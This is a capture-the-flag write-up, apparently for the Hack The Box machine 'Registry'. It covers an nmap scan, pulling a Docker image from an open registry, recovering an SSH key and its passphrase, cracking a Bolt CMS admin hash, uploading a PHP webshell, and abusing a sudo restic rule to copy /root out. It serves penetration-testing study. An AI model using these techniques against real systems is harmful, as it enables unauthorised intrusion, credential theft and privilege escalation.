## nmap
```
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
|_SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Add docker.registry.htb to /etc/hosts

## https://docker.registry.htb/v2/_catalog
```json

{
    repositories: [
        "bolt-image"
    ]
}
```

listed tags, and pulled bolt-image/latest with https://github.com/zoeyg/docker_fetch

```sh
git clone ...
python docker_image_fetch.py -u https://docker.registry.htb
```

# Exploring the docker image

## /root/.bash_history
```sh
apt install git
apt install php
php --ini |grep Loaded
l /etc/php/
l /etc/php/7.2/
apt install nginx
apt install php-fpm
cd /var/www/html/
rm -rf index.html 
mv index.nginx-debian.html index.html
git clone https://github.com/bolt/bolt.git
useradd -m bolt
userdel bolt
rm -rf /home/bolt/
cd /root/
mkdir .ssh
cd .ssh/
vi config
ssh-keygen -t rsa -b 4096 -C "bolt@registry.htb"
ssh-add /root/.ssh/id_rsa
eval `ssh-agent -s`
ssh-add /root/.ssh/id_rsa
cat /etc/profile.d/01-locale-fix.sh 
cat /etc/profile
cat /etc/bash.bashrc
vi /etc/profile.d/01-ssh.sh
apt install expect
vi /etc/profile.d/01-ssh.sh
l /etc/profile.d/
sh /etc/profile.d/01-ssh.sh 
apt install spawn
chmod +x /etc/profile.d/01-ssh.sh
/etc/profile.d/01-ssh.sh 
ps aux
ssh registry
ping registry.htb
apt install ping
apt install iputils-ping
cp 01-ssh.sh 02-ssh.sh 
vi 01-ssh.sh 
ssh 01-ssh.sh 
chmod +x 01-
chmod +x 01-ssh.sh 
./01-ssh.sh 
ps aux
ssh registry
cd /root/
vi .profile 
ps aux
cat /etc/profile.d/01-ssh.sh 
vi .profile 
eval `ssh-agent -s`
vi .profile 
systemctl restart nginx.service
/etc/init.d/nginx start
/etc/init.d/php7.2-fpm start
cd /var/www/html/
vi sync.sh
./sync.sh 
apt install rsync
./sync.sh 
/etc/profile.d/01-ssh.sh 
/etc/profile.d/02-ssh.sh 
./sync.sh 
rm -rf bolt/
./sync.sh 
exit
```

## /root/.ssh/id_rsa in the image
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

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
Bdtfi9goJBFb6P7yHapZ13W30b96ZQG4Gdf4ZeV6MPMizcTbiggZRBokZLCBMb5H
pgkPgTrGJlbm+sLu/kt4jgex3T/NWwXHVrny5kIuTbbv1fXfyfkPqU66eysstO2s
OxciNk4W41o9YqHHYM9D/uL6xMqO3K/LTYUI+LcCK13pkjP7/zH+bqiClfNt0D2B
Xg6OWYK7E/DTqX+7zqNQp726sDAYKqQNpwgHldyDhOG3i8o66mLj3xODHQzBvwKR
bJ7jrLPW+AmQwo/V8ElNFPyP6oZBEdoNVn/plMDAi0ZzBHJc7hJ0JuHnMggWFXBM
PjxG/w4c8XV/Y2WavafEjT7hHuviSo6phoED5Zb3Iu+BU+qoEaNM/LntDwBXNEVu
Z0pIXd5Q2EloUZDXoeyMCqO/NkcIFkx+//BDddVTFmfw21v2Y8fZ2rivF/8CeXXZ
ot6kFb4G6gcxGpqSZKY7IHSp49I4kFsC7+tx7LU5/wqC9vZfuds/TM7Z+uECPOYI
f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9
RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
-----END RSA PRIVATE KEY-----
```

## /etc/profile.d/01-ssh.sh
```sh
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n"; <--- password for private key
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

## registry.htb virtual host config
```
/etc/nginx/sites-enabled/01.registry.conf 
server {
    listen 80;
    listen [::]:80;
    listen 443 ssl;
    include snippets/self-signed.conf;
    include snippets/ssl-params.conf;

    root /var/www/html;
    index index.php index.html; 

    server_name registry.htb;

    location = /bolt/app/database/bolt.db {
        deny all;
        return 404;
    }

    location = /bolt/bolt {
        try_files               $uri $uri/ /bolt/index.php?$query_string;
    }

    location ^~ /bolt/bolt/ {
        try_files                     $uri /bolt/index.php?$query_string;
    }

    location ^~ /bolt/(.*)$ {
        try_files               $uri $uri/ /bolt/index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
    }

    location ~ /\.ht {
        deny all;
    }
}
```

Notice the database file

## /etc/nginx/sites-enabled/02.docker.registry.conf
```
server {
    listen 80;
    listen [::]:80;
    listen 443 ssl;
    include snippets/self-signed.conf;
    include snippets/ssl-params.conf;
    
    root /var/www/html;
    index index.html index.htm index.nginx-debian.html;

    server_name docker.registry.htb;

    location / {
        # Do not allow connections from docker 1.5 and earlier
        # docker pre-1.6.0 did not properly set the user agent on ping, catch "Go *" user agents
        if ($http_user_agent ~ "^(docker\/1\.(3|4|5(?!\.[0-9]-dev))|Go ).*$" ) {
            return 404;
        }

        proxy_pass                          http://127.0.0.1:5000;
        proxy_set_header  Host              $http_host;   # required for docker client's sake
        proxy_set_header  X-Real-IP         $remote_addr; # pass on real client's IP
        proxy_set_header  X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header  X-Forwarded-Proto $scheme;
        proxy_read_timeout                  900;
    }
}
```

## /var/www/html/backup.php
```php
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```
Use this for getting root, still need to figure out how to get access to www-data

## /var/www/html/bolt/app/database/bolt.db
Inspecting the bolt web app's database

```sql
sqlite> .tables
bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
bolt_blocks       bolt_homepage     bolt_relations  
bolt_cron         bolt_log_change   bolt_showcases  
bolt_entries      bolt_log_system   bolt_taxonomy   
sqlite> select * from bolt_users
   ...> ;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|["files://shell.php"]|1||||0||["root","everyone"]
sqlite> PRAGMA table_info(bolt_users)
   ...> ;
0|id|INTEGER|1||1
1|username|VARCHAR(32)|1||0
2|password|VARCHAR(128)|1||0
3|email|VARCHAR(254)|1||0
4|lastseen|DATETIME|0|NULL|0
5|lastip|VARCHAR(45)|0|NULL|0
6|displayname|VARCHAR(32)|1||0
7|stack|CLOB|1||0
8|enabled|BOOLEAN|1|'1'|0
9|shadowpassword|VARCHAR(128)|0|NULL|0
10|shadowtoken|VARCHAR(128)|0|NULL|0
11|shadowvalidity|DATETIME|0|NULL|0
12|failedlogins|INTEGER|1|0|0
13|throttleduntil|DATETIME|0|NULL|0
14|roles|CLOB|1||0
sqlite> PRAGMA table_info(bolt_authtoken)
```

## Cracking admin hash
Drop hash from database into bolt-admin.hash `$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK`
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt bolt-admin.hash
```

## Getting a webshell
According to `pspy64s` there's a cron job that removes the upload files for the webapp and resets the `config.yml`.  You need to quickly
* In the admin interface, change the config to allow `php` file uploads
* Upload `makeshell.php` and access it to generate `shell.php` in the bolt directory

## Running enunmeration reveals...
```
[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

## Setting up and using restic to grab root ssh keys
I think iptables is preventing outbound connections so used scp to transfer the rest-server executable to the target machine
```sh
# as bolt
restic init --repo restic
./rest-server --path /tmp/restic --no-auth
# do the next in the webshell under www-data
echo 'password' | sudo restic backup -r rest:http://localhost:8000 /root
# as bolt
restic restore -r rest:http://localhost:8000 latest -t test
cat /tmp/test/root/root.txt
```
 Probably could've also just forwarded ports using ssh: `Ssh -R 8001:10.10.14.16:8001 -i id_rsa bolt@registry.htb`